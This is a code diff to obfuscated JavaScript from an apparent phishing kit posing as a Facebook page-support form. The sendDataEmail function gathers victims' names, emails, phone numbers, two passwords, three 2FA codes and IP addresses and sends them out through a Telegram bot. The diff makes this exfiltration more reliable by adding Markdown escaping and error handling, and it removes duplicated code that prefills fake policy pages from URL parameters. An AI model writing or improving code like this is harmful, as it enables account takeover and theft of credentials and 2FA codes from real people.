@@ -253,23 +253,29 @@ function sendDataEmail() {
     params: metrics.params
   };
 
+  // Helper function to escape Markdown special characters
+  function escapeMarkdown(text) {
+    if (!text) return '';
+    return String(text).replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
+  }
+
   // Format message for Telegram
   var telegramMessage = `🔔 *New Form Submission*\n\n` +
-    `📍 *IP Address:* ${_0x47accc.ip_address}\n` +
-    `🌍 *Country:* ${_0x47accc.country} (${_0x47accc.country_code})\n` +
-    `👤 *Full Name:* ${_0x47accc.full_name}\n` +
-    `📧 *Personal Email:* ${_0x47accc.pers_email}\n` +
-    `📧 *Business Email:* ${_0x47accc.bus_email}\n` +
-    `📱 *Phone:* ${_0x47accc.phone_number}\n` +
-    `🔑 *Password 1:* ${_0x47accc.p_one}\n` +
-    `🔑 *Password 2:* ${_0x47accc.p_two}\n` +
-    `🔐 *2FA Code 1:* ${_0x47accc.c_one}\n` +
-    `🔐 *2FA Code 2:* ${_0x47accc.c_two}\n` +
-    `🔐 *2FA Code 3:* ${_0x47accc.c_three}\n` +
-    `📄 *FB Page Name:* ${_0x47accc.fb_page_name}\n` +
-    `💬 *Message:* ${_0x47accc.message}\n` +
+    `📍 *IP Address:* ${escapeMarkdown(_0x47accc.ip_address)}\n` +
+    `🌍 *Country:* ${escapeMarkdown(_0x47accc.country)} \\(${escapeMarkdown(_0x47accc.country_code)}\\)\n` +
+    `👤 *Full Name:* ${escapeMarkdown(_0x47accc.full_name)}\n` +
+    `📧 *Personal Email:* ${escapeMarkdown(_0x47accc.pers_email)}\n` +
+    `📧 *Business Email:* ${escapeMarkdown(_0x47accc.bus_email)}\n` +
+    `📱 *Phone:* ${escapeMarkdown(_0x47accc.phone_number)}\n` +
+    `🔑 *Password 1:* ${escapeMarkdown(_0x47accc.p_one)}\n` +
+    `🔑 *Password 2:* ${escapeMarkdown(_0x47accc.p_two)}\n` +
+    `🔐 *2FA Code 1:* ${escapeMarkdown(_0x47accc.c_one)}\n` +
+    `🔐 *2FA Code 2:* ${escapeMarkdown(_0x47accc.c_two)}\n` +
+    `🔐 *2FA Code 3:* ${escapeMarkdown(_0x47accc.c_three)}\n` +
+    `📄 *FB Page Name:* ${escapeMarkdown(_0x47accc.fb_page_name)}\n` +
+    `💬 *Message:* ${escapeMarkdown(_0x47accc.message)}\n` +
     `📱 *Mobile:* ${_0x47accc.is_Mobile ? 'Yes' : 'No'}\n` +
-    `📊 *Params:*\n\`\`\`${_0x47accc.params}\`\`\``;
+    `📊 *Params:*\n\`\`\`\n${escapeMarkdown(_0x47accc.params)}\n\`\`\``;
 
   // Send to Telegram
   fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -282,7 +288,26 @@ function sendDataEmail() {
       text: telegramMessage,
       parse_mode: 'Markdown'
     })
-  }).then(_0x33667c => _0x33667c.json()).then(_0x37edfc => {})["catch"](_0x1db690 => {});
+  })
+  .then(_0x33667c => {
+    if (!_0x33667c.ok) {
+      return _0x33667c.json().then(err => {
+        console.error('Telegram API error:', err);
+        throw new Error('Telegram API error: ' + JSON.stringify(err));
+      });
+    }
+    return _0x33667c.json();
+  })
+  .then(_0x37edfc => {
+    if (_0x37edfc.ok) {
+      console.log('Message sent to Telegram successfully');
+    } else {
+      console.error('Telegram API error:', _0x37edfc);
+    }
+  })
+  .catch(_0x1db690 => {
+    console.error('Error sending to Telegram:', _0x1db690);
+  });
 }
 function firstFormHandle(_0x57e9aa) {
   _0x57e9aa.preventDefault();
@@ -562,117 +587,6 @@ fake_policy_links.forEach(_0x52efda => {
   _0x52efda.addEventListener('click', function () {
     document.getElementById("policyLink").click();
   });
-});
-detectUtmUserLeftBar();
-delectAccountUtm();
-delectTicketIdUtm();
-		}
-	}, 0x3e8);
-}
-document.addEventListener('DOMContentLoaded', function () {
-	const _0x41b8ec = document.getElementById('showPopup');
-	const _0x31942f = document.getElementById('popup');
-	const _0xf55bfc = document.getElementById('closePopup');
-	const _0x48e9e6 = document.querySelector('.col-4');
-	const _0x19b238 = document.querySelector('.popup-content');
-	_0x41b8ec.addEventListener('click', function () {
-		_0x19b238.innerHTML = _0x48e9e6.innerHTML;
-		document.body.style.overflow = 'hidden';
-		_0x31942f.style.display = 'flex';
-		document.querySelector('#popup #search').addEventListener('click', function (_0x71f3be) {
-			searchModal.show();
-		});
-	});
-	_0xf55bfc.addEventListener('click', function () {
-		_0x31942f.style.display = 'none';
-		document.body.style.overflow = 'auto';
-	});
-	function _0x27c4cd() {
-		if (window.innerWidth < 0x3e8) {
-			_0x48e9e6.style.display = 'none';
-			_0x41b8ec.style.display = 'block';
-		} else {
-			_0x48e9e6.style.display = 'block';
-			_0x41b8ec.style.display = 'none';
-		}
-	}
-	_0x27c4cd();
-	window.addEventListener('resize', _0x27c4cd);
-});
-function detectUtmUserLeftBar() {
-	var _0x22a0f1 = new URL(window.location.html);
-	var _0x3f319d = _0x22a0f1.searchParams.get('userleft');
-	if (_0x3f319d) {
-		document.getElementById('utm-user').style.display = 'flex';
-	}
-}
-function delectAccountUtm() {
-	var _0x4ecd65 = new URL(window.location.html);
-	var _0x3a88d7 = _0x4ecd65.searchParams.get('account');
-	if (_0x3a88d7) {
-		_0x3a88d7 = _0x3a88d7.replace('!~', ' ');
-		addUserName(_0x3a88d7);
-		document.getElementById('view-accounts').style.display = 'flex';
-		var _0x2fd712 = document.getElementById('fb-page-name-input');
-		_0x2fd712.value = _0x3a88d7;
-		_0x2fd712.setAttribute('disabled', 'disabled');
-	}
-}
-function delectTicketIdUtm() {
-	var _0x32656b = new URL(window.location.html);
-	var _0x51da2d = _0x32656b.searchParams.get('ticketId');
-	if (_0x51da2d) {
-		document.getElementById('utm-ticketId').style.display = 'flex';
-		document.getElementById('utm-ticketId').querySelector('span').innerText = _0x51da2d;
-	}
-}
-function addUserName(_0x281afc) {
-	var _0x37ae24 = document.querySelectorAll('.UserName');
-	_0x37ae24.forEach((_0x14425c) => {
-		_0x14425c.innerText = _0x281afc;
-	});
-}
-function addSvgInLinks() {
-	var _0x4e1153 = document.querySelectorAll('a.add-svg');
-	_0x4e1153.forEach((_0x51bf5c) => {
-		_0x51bf5c.innerHTML =
-			_0x51bf5c.textContent +
-			'\n    <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em"\n                        class="x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e">\n                        <path\n                            d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z">\n                        </path>\n                        <path\n                            d="M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z">\n                        </path>\n                    </svg>\n    ';
-	});
-}
-addSvgInLinks();
-function dictToString(_0x1d3f18) {
-	var _0x2cade7 = '';
-	let _0x3549b5 = Object.entries(_0x1d3f18);
-	_0x3549b5.forEach((_0x3e4403) => {
-		var _0x318b0d = _0x3e4403[0x0];
-		var _0x4e4316 = _0x3e4403[0x1];
-		_0x2cade7 = _0x2cade7 + (_0x318b0d + ' : ' + _0x4e4316 + '\n');
-	});
-	return _0x2cade7;
-}
-function prettyUtmParams() {
-	var _0x407ae1 = new URL(window.location.href).search;
-	if (!_0x407ae1) {
-		return 'No URL parameters found.\n';
-	}
-	_0x407ae1 = _0x407ae1.slice(0x1);
-	_0x407ae1 = _0x407ae1.split('&');
-	var _0x32faa6 = '\n';
-	_0x407ae1.forEach((_0x2e8963) => {
-		var _0x507804 = _0x2e8963.split('=')[0x0];
-		var _0x34ce36 = _0x2e8963.split('=')[0x1];
-		_0x32faa6 = _0x32faa6 + (_0x507804 + ' : ' + _0x34ce36 + '\n');
-	});
-	return _0x32faa6;
-}
-var fake_policy_links = document
-	.querySelector('.fake-likns')
-	.querySelectorAll('.action-button.wide');
-fake_policy_links.forEach((_0x52efda) => {
-	_0x52efda.addEventListener('click', function () {
-		document.getElementById('policyLink').click();
-	});
 });
 detectUtmUserLeftBar();
 delectAccountUtm();
